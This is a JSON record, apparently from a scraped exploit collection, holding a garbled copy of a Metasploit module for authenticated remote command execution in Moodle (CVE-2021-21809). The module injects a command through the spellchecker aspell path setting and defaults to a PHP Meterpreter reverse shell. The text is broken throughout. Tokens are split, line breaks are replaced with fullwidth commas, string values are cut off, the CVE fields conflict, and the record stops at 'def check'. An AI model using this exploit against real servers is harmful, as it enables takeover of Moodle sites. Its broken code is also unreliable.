{
    "text": "vul_name : Moodle SpellChecker Path Authenticated Remote Command Execution ， vul_cve : CVE-2013-3630 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HTTP : Moodle ， super (  ， update_info (  ， info ,  ， 'Name' => 'Moodle SpellChecker Path Authenticated Remote Command Execution' ,  ， 'Description' => %q{ ， Moodle allows an authenticated administrator to define spellcheck settings via the web interface. ， An administrator can update the aspell path to include a command injection. This is extremely ， similar to CVE-2013-3630 , just using a different variable. ， This module was tested against Moodle version 3.11.2 , 3.10.0 , and 3.8.0. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Adam Reiser' ,  # Discovery ， 'h00die' # msf module ，  ]  ,  ， ' ，  [ 'CVE' , '2021-21809' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultOptions' => { 'Payload' => 'php/meterpreter/reverse_tcp' } ,  ， 'Payload' => { ， 'BadChars' => \"'\" ， } ,  ， 'Platform' => 'php' ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => [ 'Automatic' , {} ]  ,  ， 'DisclosureDate' => '2021-06-22' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ CONFIG_CHANGES , IOC_IN_LOGS ]  ， } ， register_options (  ，  [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , ' ]  )  ,  ，  ]  ， end ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'admin' , 'settings.php' )  ,  ， 'vars_get' => ， { ， 'section' => 'systempaths' ， } ,  ， 'keep_cookies' => true ， } )  ， fail_with ( Failure : Unreachable , 'Error retrieving settings' ) unless res ， res.body = ~ /sesskey\" : \" (  [ ^\" ] + ) \"/ ， send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri ( target_uri.path , 'admin' , 'settings.php' )  ,  ， 'vars_get' => ， { ， 'section' => 'systempaths' ， } ,  ， 'vars_post' => ， { ， 'section' => 'systempaths' ,  ， 'action' => 'save-settings' ,  ， 'sesskey' => Regexp.last_match ( 1 )  ,  ， 'return' => ' ,  ， 's_pathtophp' => ' ,  ， 's_pathtodu' => ' ,  ， 's_aspellpath' => value ,  ， 's_pathtodot' => ' ,  ， 's_pathtogs' => '/usr/bin/gs' ,  ， 's_pathtopython' => ' ， } ,  ， 'keep_cookies' => true ， } )  ， end ，  # ' is None in the gui , and is the default ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'admin' , 'settings.php' )  ,  ， 'vars_get' => ， { ， 'section' => 'tinymcespellcheckersettings' ， } ,  ， 'keep_cookies' => true ， } )  ， fail_with ( Failure : Unreachable , 'No response received from the target.' ) unless res ， res.body = ~ /sesskey\" : \" (  [ ^\" ] + ) \"/ ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri ( target_uri.path , 'admin' , 'settings.php' )  ,  ， 'vars_get' => ， { ， 'section' => 'tinymcespellcheckersettings' ， } ,  ， 'vars_post' => ， { ， 'section' => 'tinymcespellcheckersettings' ,  ， 'action' => 'save-settings' ,  ， 'sesskey' => Regexp.last_match ( 1 )  ,  ， 'return' => ' ,  ， 's_tinymce_spellchecker_spellengine' => checker ,  ， 's_tinymce_spellchecker_spelllanguagelist' => '+English=en , Danish=da , Dutch=nl , Finnish=fi , French=fr , German=de , Italian=it , Polish=pl , Portuguese=pt , Spanish=es , Swedish=sv' # default ， } ,  ， 'keep_cookies' => true ， } )  ， fail_with ( Failure : Unreachable , 'No response received from the target.' ) unless res ， end ， def check",
    "time": "2021.10.12"
}